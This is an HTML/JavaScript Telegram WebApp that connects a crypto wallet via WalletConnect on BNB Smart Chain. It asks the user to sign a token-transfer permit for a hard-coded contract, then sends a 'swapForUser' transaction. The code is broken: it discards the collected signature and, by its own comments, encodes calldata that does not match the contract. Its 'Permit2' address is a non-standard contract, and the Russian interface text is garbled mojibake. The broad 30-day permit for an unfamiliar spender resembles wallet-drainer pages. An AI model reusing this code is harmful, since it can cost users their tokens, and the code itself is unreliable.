<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Telegram WebApp Swap</title>
  <!-- Telegram WebApp SDK -->
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <!-- WalletConnect Modal & EthereumProvider (v2) -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/dist/index.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
  <style>
    body { font-family: sans-serif; margin: 20px; }
    input, button { padding: 6px; margin: 4px 0; width: 100%; max-width: 400px; }
    button { cursor: pointer; }
    #swapBtn:disabled { opacity: 0.5; cursor: not-allowed; }
    #status { color: red; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h2>Swap via AutoSwap (BSC)</h2>
  <button id="connectBtn">üîó –ü–æ–¥–∫–ª—é—á–∏—Ç—å –∫–æ—à–µ–ª—ë–∫</button>
  <div id="walletInfo" style="display:none; margin: 10px 0;">
    <div>üü¢ <b>–ê–¥—Ä–µ—Å:</b> <span id="account"></span></div>
    <div>üîó <b>–°–µ—Ç—å:</b> <span id="chain"></span></div>
  </div>
  <div style="margin-top:10px;">
    <input id="tokenIn" type="text" placeholder="–ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞ FROM (ERC20)" value="0x55D398326f99059fF775485246999027B3197955"/>
    <input id="tokenOut" type="text" placeholder="–ê–¥—Ä–µ—Å —Ç–æ–∫–µ–Ω–∞ TO (ERC20)" value="0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f"/>
    <input id="amount" type="text" placeholder="–°—É–º–º–∞ (–≤ –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –µ–¥–∏–Ω–∏—Ü–∞—Ö)" value="1000000000000000000"/>
    <button id="swapBtn" disabled>üîÑ Swap</button>
  </div>
  <div id="status"></div>

<script>
  const tg = window.Telegram.WebApp;
  tg.ready();

  const PROJECT_ID = "d868f90cd734355ae0320f8f0258b6b1";
  const PERMIT2_CONTRACT = "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4";
  const AUTOSWAP_CONTRACT = "0x026C54B156b501ad9cEa422e59454D4b6d6f6963";
  const BSC_CHAIN_ID = 56;

  let provider;
  let accounts = [];
  let chainId;

  const connectBtn = document.getElementById('connectBtn');
  const swapBtn = document.getElementById('swapBtn');
  const accountSpan = document.getElementById('account');
  const chainSpan = document.getElementById('chain');
  const walletInfoDiv = document.getElementById('walletInfo');
  const statusDiv = document.getElementById('status');

  function setStatus(text, color = "red") {
    statusDiv.style.color = color;
    statusDiv.textContent = text;
  }

  function hexPad(hexStr, length = 64) {
    if (hexStr.startsWith('0x')) hexStr = hexStr.slice(2);
    return hexStr.padStart(length, '0');
  }

  connectBtn.onclick = async () => {
    setStatus("");
    try {
      provider = await WalletConnectEthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [BSC_CHAIN_ID],
        showQrModal: true,
        methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
        rpcMap: {
          [BSC_CHAIN_ID]: "https://bsc-dataseed.binance.org"
        },
        metadata: {
          name: "Telegram Swap WebApp",
          description: "Demo Swap via WalletConnect",
          url: window.location.href,
          icons: []
        }
      });
      accounts = await provider.enable();
      chainId = await provider.request({ method: 'eth_chainId' });
    } catch (err) {
      console.error("WalletConnect connect error:", err);
      setStatus("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ –∫–æ—à–µ–ª—å–∫—É.");
      return;
    }

    connectBtn.disabled = true;
    swapBtn.disabled = false;
    walletInfoDiv.style.display = "block";
    accountSpan.textContent = accounts[0];
    chainSpan.textContent = (parseInt(chainId, 16)) + " (expected 56)";
    if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
      setStatus("‚ö†Ô∏è –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω –Ω–µ –∫ BSC. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ —Å–µ—Ç—å –≤ –∫–æ—à–µ–ª—å–∫–µ.");
    } else {
      setStatus("");
    }
  };

  swapBtn.onclick = async () => {
    setStatus("");
    if (!provider || accounts.length === 0) {
      setStatus("–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª—ë–∫.");
      return;
    }
    if (parseInt(chainId, 16) !== BSC_CHAIN_ID) {
      setStatus("–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–∞—è —Å–µ—Ç—å. –¢—Ä–µ–±—É–µ—Ç—Å—è BSC (56).");
      return;
    }

    const tokenIn = document.getElementById('tokenIn').value.trim();
    const tokenOut = document.getElementById('tokenOut').value.trim();
    const amountStr = document.getElementById('amount').value.trim();

    if (!tokenIn || !tokenOut || !amountStr) {
      setStatus("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∞–¥—Ä–µ—Å–∞ —Ç–æ–∫–µ–Ω–æ–≤ –∏ —Å—É–º–º—É.");
      return;
    }

    let amount;
    try {
      amount = BigInt(amountStr);
    } catch {
      setStatus("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Å—É–º–º—ã.");
      return;
    }

    const owner = accounts[0];

    // –¢–µ–∫—É—â–∏–π timestamp –¥–ª—è nonce, deadline = —Å–µ–π—á–∞—Å + 30 –¥–Ω–µ–π (2592000 —Å–µ–∫—É–Ω–¥)
    const nonce = BigInt(Date.now());
    const deadline = BigInt(Math.floor(Date.now() / 1000) + 2592000);

    // EIP-712 Permit2 —Å—Ç—Ä—É–∫—Ç—É—Ä–∞
    const domain = {
      name: "Permit2",
      chainId: BSC_CHAIN_ID,
      verifyingContract: PERMIT2_CONTRACT,
    };
    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "spender", type: "address" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" }
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" }
      ]
    };
    const message = {
      permitted: { token: tokenIn, amount: amount.toString() },
      spender: AUTOSWAP_CONTRACT,
      nonce: nonce.toString(),
      deadline: deadline.toString()
    };
    const typedData = {
      types: types,
      domain: domain,
      primaryType: "PermitTransferFrom",
      message: message
    };

    let signature;
    try {
      signature = await provider.request({
        method: 'eth_signTypedData_v4',
        params: [owner, JSON.stringify(typedData)]
      });
    } catch (err) {
      console.error("Signing error:", err);
      setStatus("–ü–æ–¥–ø–∏—Å—å –æ—Ç–º–µ–Ω–µ–Ω–∞ –∏–ª–∏ –ø—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞.");
      return;
    }
    if (typeof signature !== "string") {
      setStatus("–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –ø–æ–¥–ø–∏—Å–∏.");
      return;
    }

    // –†–∞–∑–±–∏—Ä–∞–µ–º –ø–æ–¥–ø–∏—Å—å –Ω–∞ r, s, v
    const sig = signature.startsWith("0x") ? signature.slice(2) : signature;
    const r = "0x" + sig.slice(0, 64);
    const s = "0x" + sig.slice(64, 128);
    let v = parseInt(sig.slice(128, 130), 16);
    if (v < 27) v += 27;

    // –§–æ—Ä–º–∏—Ä—É–µ–º calldata –¥–ª—è swapForUser(address user, uint160 amountUSDT, uint48 expiration, uint48 nonce, uint8 v, bytes32 r, bytes32 s)
    // –ò–∑ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞: swapForUser(address user, uint256 amountUSDT) ‚Äî —É–ø—Ä–æ—â–∞–µ–º –¥–ª—è –ø—Ä–∏–º–µ—Ä–∞

    // –í –¥–∞–Ω–Ω–æ–º –∫–æ–Ω—Ç—Ä–∞–∫—Ç–µ swapForUser —Ç—Ä–µ–±—É–µ—Ç –º–Ω–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤, –Ω–æ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –ø–æ–ª–æ–∂–∏–º –≤ calldata —Ç–æ–ª—å–∫–æ user –∏ amountUSDT,
    // –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω—É–∂–Ω–æ —Ä–∞—Å—à–∏—Ä–∏—Ç—å ABI –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ.

    // –ü–æ–ª–Ω–∞—è –∫–æ–¥–∏—Ä–æ–≤–∫–∞ (–ø—Ä–∏–º–µ—Ä —Å –±–∞–∑–æ–≤—ã–º –≤—ã–∑–æ–≤–æ–º swapForUser(user, amountUSDT)):
    // –°–∏–≥–Ω–∞—Ç—É—Ä–∞: swapForUser(address,uint256)
    // –ú–µ—Ç–æ–¥ ID = keccak256("swapForUser(address,uint256)") –ø–µ—Ä–≤—ã–µ 4 –±–∞–π—Ç–∞ = 0xc39f77ed

    const methodId = "0xc39f77ed";
    const encodedUser = hexPad(owner);
    const encodedAmount = hexPad(amount.toString(16));
    const data = methodId + encodedUser + encodedAmount;

    const txParams = {
      from: owner,
      to: AUTOSWAP_CONTRACT,
      data: data
    };

    try {
      const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [txParams]
      });
      setStatus("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! Tx Hash: " + txHash, "green");
    } catch (err) {
      console.error("Transaction error:", err);
      setStatus("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.");
    }
  };
</script>
</body>
</html>
